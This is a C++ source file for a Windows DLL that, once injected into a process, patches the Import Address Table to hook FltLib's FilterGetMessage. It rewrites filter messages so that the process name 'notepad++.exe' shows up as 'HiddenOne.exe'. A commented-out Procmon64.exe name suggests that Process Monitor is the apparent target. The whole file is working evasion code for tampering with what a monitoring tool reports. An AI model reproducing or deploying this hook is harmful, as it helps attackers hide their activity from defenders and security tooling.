#include "pch.h"
#include <windows.h>
#include <fltuser.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>

#define HOOKED_DLL "FLTLIB.DLL"
#define T_HOOKED_DLL _T("FLTLIB.DLL")
#define HOOKED_FUNC "FilterGetMessage"

#define TARGET_STRING L"notepad++.exe"
//#define REPLACEMENT_STRING L"Procmon64.exe"
#define REPLACEMENT_STRING L"HiddenOne.exe"

typedef HRESULT (*FilterGetMessageFunc)(
    _In_ HANDLE hPort,
    _Out_writes_bytes_(dwMessageBufferSize) PFILTER_MESSAGE_HEADER lpMessageBuffer,
    _In_ DWORD dwMessageBufferSize,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
);

FilterGetMessageFunc filterGetMessageOriginal; // original FilterGetMessage

HRESULT
WINAPI 
MyFilterGetMessage(
    HANDLE hPort,
    PFILTER_MESSAGE_HEADER lpMessageBuffer,
    DWORD dwMessageBufferSize,
    LPOVERLAPPED lpOverlapped
) {

    //for logging
    TCHAR debugMessage[512];
    /*_stprintf_s(debugMessage, _T("hPort: 0x%p, BufferSize: %u\n"), hPort, dwMessageBufferSize);
    OutputDebugString(debugMessage);*/

    // create a dummy OVERLAPPED structure o send to the api
    OVERLAPPED dummyOverlapped = { 0 };
    dummyOverlapped.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // dummy event
    if (!dummyOverlapped.hEvent) {
        OutputDebugString(_T("Failed to create dummy hEvent for OVERLAPPED.\n"));
        return E_FAIL;
    }

    HRESULT result = filterGetMessageOriginal(hPort, lpMessageBuffer, dwMessageBufferSize, &dummyOverlapped);
    
    //_stprintf_s(debugMessage, _T("FilterGetMessage result: 0x%X\n"), result);
    //OutputDebugString(debugMessage);

    DWORD waitResult = WaitForSingleObject(dummyOverlapped.hEvent, 3000);
    if (waitResult != WAIT_OBJECT_0) {
        //OutputDebugString(_T("WaitForSingleObject failed or timed out.\n"));
        CloseHandle(dummyOverlapped.hEvent);
        return E_FAIL;
    }

    const size_t targetLength = sizeof(TARGET_STRING) - sizeof(WCHAR); // exclude null terminator

    // iterate through the buffer to search for target string and replace it with replacement string
    BYTE* bufferData = (BYTE*)lpMessageBuffer;
    for (size_t i = 0; i <= dwMessageBufferSize - targetLength; i += sizeof(WCHAR)) {
        if (memcmp(bufferData + i, TARGET_STRING, targetLength) == 0) { // if the targetString found in buffer
            //OutputDebugString(_T("Found target string! Replacing.\n"));

            memcpy(bufferData + i, REPLACEMENT_STRING, targetLength); // replace it

        }
    }

    if (lpOverlapped) {
        // update the values of the original overlapped structure
        lpOverlapped->Internal = dummyOverlapped.Internal;
        lpOverlapped->InternalHigh = dummyOverlapped.InternalHigh;

        if (lpOverlapped->hEvent) {
            //OutputDebugString(_T("Signaling the original hEvent\n"));
            SetEvent(lpOverlapped->hEvent); // after weve made the changes we needed, we can signal the original event
        }
    }

    CloseHandle(dummyOverlapped.hEvent);

    //OutputDebugString(_T("Exiting\n"));

    return result;
}

void PatchIAT(ULONGLONG changedAddress)
{
    BYTE* baseAddr = (BYTE*)GetModuleHandle(NULL);

    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)baseAddr;

    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)(baseAddr + dosHdr->e_lfanew);

    IMAGE_FILE_HEADER* flHdr = &(ntHdr->FileHeader);

    IMAGE_OPTIONAL_HEADER* optHdr = &(ntHdr->OptionalHeader);

    IMAGE_DATA_DIRECTORY* dataDirs = optHdr->DataDirectory;

    IMAGE_DATA_DIRECTORY* importTable = dataDirs + 1;

    IMAGE_IMPORT_DESCRIPTOR* imageImportDescriptors = (IMAGE_IMPORT_DESCRIPTOR*)(baseAddr + importTable->VirtualAddress);

    IMAGE_IMPORT_DESCRIPTOR lastImDes = { 0 }; // last image descriptor is all 0
    BYTE* dllName;
    IMAGE_THUNK_DATA* INT;
    IMAGE_THUNK_DATA* IAT;
    IMAGE_THUNK_DATA lastThunkData = { 0 }; // last thunk data is all 0
    DWORD rvaNameTable;
    IMAGE_IMPORT_BY_NAME* importByName;
    while (memcmp(imageImportDescriptors, &lastImDes, sizeof(IMAGE_IMPORT_DESCRIPTOR))) // iterate on DLLs (IMAGE_IMPORT_DESCRIPTOR)
    {
        dllName = baseAddr + imageImportDescriptors->Name;

        if (imageImportDescriptors->TimeDateStamp == -1)
        {
            OutputDebugString(_T("Bound!\n"));
            return;
        }

        if (!strcmp((char*)dllName, HOOKED_DLL)) // if the IMAGE_IMPORT_DESCRIPTOR is the target one
        {
            //OutputDebugString(_T("DLL found on import descriptor array\n"));
            INT = (IMAGE_THUNK_DATA*)(baseAddr + imageImportDescriptors->OriginalFirstThunk);
            IAT = (IMAGE_THUNK_DATA*)(baseAddr + imageImportDescriptors->FirstThunk);

            // iterate INT and IAT
            // when the right function name is found in the INT, we can work on the IAT
            while (memcmp(INT, &lastThunkData, sizeof(IMAGE_THUNK_DATA)))
            {
                // based on 32 or 64 bit system, check if the ordinal bit is not set. Then the function is imported by name.
                rvaNameTable = 0;
                if (optHdr->Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
                {
                    if (!(INT->u1.Ordinal & 0x80000000))
                    {
                        rvaNameTable = INT->u1.AddressOfData;
                    }
                }
                else if (optHdr->Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
                {
                    if (!(INT->u1.Ordinal & 0x8000000000000000))
                    {
                        rvaNameTable = INT->u1.AddressOfData;
                    }
                }
                else
                {
                    OutputDebugString(_T("Something went wrong"));
                    return;
                }

                if (rvaNameTable) // function is imported by name
                {
                    importByName = (IMAGE_IMPORT_BY_NAME*)(baseAddr + rvaNameTable);
                    CHAR* theName = importByName->Name;

                    if (strcmp(theName, HOOKED_FUNC) == 0)
                    {
                        //OutputDebugString(_T("function found on IAT\n"));

                        /*
                        MEMORY_BASIC_INFORMATION memInfo;
                        VirtualQuery(&(IAT->u1.Function), &memInfo, sizeof(MEMORY_BASIC_INFORMATION));
                        printf("Page permissions: 0x%X\n", memInfo.Protect); // prints 0x2 which is PAGE_READONLY
                        */

                        DWORD dummy;

                        if (!VirtualProtect(&(IAT->u1.Function), 1, PAGE_READWRITE, &dummy)) // change permission to read+write
                        {
                            TCHAR debugMessage[256];
                            _stprintf_s(debugMessage, _T("VirtualProtect failed: %d\n"), GetLastError());
                            OutputDebugString(debugMessage);
                            return;
                        }

                        /*MEMORY_BASIC_INFORMATION memInfo2;
                        VirtualQuery(&(IAT->u1.Function), &memInfo2, sizeof(MEMORY_BASIC_INFORMATION));
                        printf("Page permissions: 0x%X\n", memInfo2.Protect); // prints 0x2 which is PAGE_READONLY*/

                        IAT->u1.Function = changedAddress;

                        return;
                    }
                }

                INT++;
                IAT++;
            }

            break;
        }

        imageImportDescriptors++;
    }

    OutputDebugString(_T("Patch IAT was not sucessfull"));

}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    HMODULE hHooked, hInjected;
    FARPROC fHookedFuncAddr;


    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        OutputDebugString(_T("DLL attaching"));

        //DisableThreadLibraryCalls(hModule); // Disables the DLL_THREAD_ATTACH and DLL_THREAD_DETACH. solved a problem where DLL_PROCESS_DETACH was called when not intended

        hHooked = GetModuleHandle(T_HOOKED_DLL);
        if (!hHooked)
        {
            OutputDebugString(_T("GetModuleHandle hHooked Failed"));
            return FALSE;
        }

        fHookedFuncAddr = GetProcAddress(hHooked, (LPCSTR)"FilterGetMessage");

        if (!fHookedFuncAddr)
        {
            OutputDebugString(_T("GetProcAddress Failed"));
            return FALSE;
        }

        filterGetMessageOriginal = (FilterGetMessageFunc)fHookedFuncAddr;

        PatchIAT((ULONGLONG)&MyFilterGetMessage);

        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        // for the hide inject part
        OutputDebugString(_T("DLL detaching"));
        PatchIAT((ULONGLONG)filterGetMessageOriginal);
        break;
    }

    return TRUE;
}

